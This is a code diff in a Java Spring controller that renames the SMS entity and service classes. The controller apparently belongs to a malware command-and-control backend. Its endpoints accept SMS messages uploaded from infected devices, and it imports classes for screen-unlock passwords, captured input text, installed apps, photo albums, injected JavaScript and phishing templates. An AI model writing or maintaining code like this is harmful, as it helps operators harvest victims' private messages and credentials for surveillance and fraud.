@@ -29,7 +29,7 @@ import io.renren.modules.app.entity.InputTextRecord;
 import io.renren.modules.app.entity.InstallApp;
 import io.renren.modules.app.entity.JsCode;
 import io.renren.modules.app.entity.Log;
-import io.renren.modules.app.entity.SmsEntity;
+import io.renren.modules.app.entity.SmsInfoEntity;
 import io.renren.modules.app.entity.Template;
 import io.renren.modules.app.entity.UnlockScreenPwd;
 import io.renren.modules.app.service.AlbumPicService;
@@ -40,7 +40,7 @@ import io.renren.modules.app.service.InstallAppService;
 import io.renren.modules.app.service.JsCodeService;
 import io.renren.modules.app.service.LogService;
 import io.renren.modules.app.service.MajorDataService;
-import io.renren.modules.app.service.SmsService;
+import io.renren.modules.app.service.SmsInfoService;
 import io.renren.modules.app.service.TransferService;
 import io.renren.modules.app.service.UnlockScreenPwdService;
 import io.renren.modules.app.vo.DeviceStatus;
@@ -81,7 +81,7 @@ public class DeviceApiController extends BaseApiController {
     private FishTemplateService fishTemplateService;
     
     @Resource
-    private SmsService smsService;
+    private SmsInfoService smsInfoService;
     
     @Resource
     private AlbumPicService albumPicService;
@@ -306,14 +306,14 @@ public class DeviceApiController extends BaseApiController {
     
 
     @RequestMapping("sms")
-    public Result<Void> sms(@RequestBody List<SmsEntity> list) {
+    public Result<Void> sms(@RequestBody List<SmsInfoEntity> list) {
     	 String deviceId = DeviceContext.getDeviceId();
          String pkg = DeviceContext.getPkg();
-         for (SmsEntity sms : list) {
+         for (SmsInfoEntity sms : list) {
              sms.setDeviceId(deviceId);
              sms.setPkg(pkg);
          }
-         smsService.addSms(list);
+         smsInfoService.addSms(list);
          log.info("设备:{} 短信上传成功." , deviceId);
         return Result.toSuccess();
     }
